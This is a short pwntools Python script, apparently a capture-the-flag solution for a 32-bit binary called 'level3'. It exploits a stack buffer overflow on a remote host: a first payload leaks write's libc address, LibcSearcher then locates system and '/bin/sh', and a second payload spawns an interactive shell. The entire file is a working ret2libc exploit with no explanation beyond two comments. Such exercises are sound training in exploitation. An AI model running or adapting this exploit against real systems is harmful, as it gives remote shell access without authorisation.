from pwn import *
from LibcSearcher import *
context(arch='i386',os='linux')

# simple stack over, but the file we get was tar.gz, 
# winrar could not unzip successfully once

# p = process('./level3')
p = remote('124.126.19.106',33163)
elf = ELF('./level3',checksec=False)

write_plt = elf.plt['write']
write_got = elf.got['write']
main = elf.sym['main']

p.recvuntil("Input:\n")
payload = 'A'*(0x88+4)
payload += flat([write_plt, main, 1, write_got, 8])
p.send(payload)
write_addr = u32(p.recv(4))
log.success("write_addr = %#x",write_addr)

libc = LibcSearcher('write',write_addr)
libc_base = write_addr - libc.dump('write')
system_addr = libc_base + libc.dump('system')
binsh = libc_base + libc.dump('str_bin_sh')
log.success("system_addr = %#x, binsh = %#x"%(system_addr,binsh))

p.recvuntil("Input:\n")
payload = 'A'*(0x88+4)
payload += flat([system_addr, main, binsh])
p.send(payload)
sleep(0.1)
p.interactive()
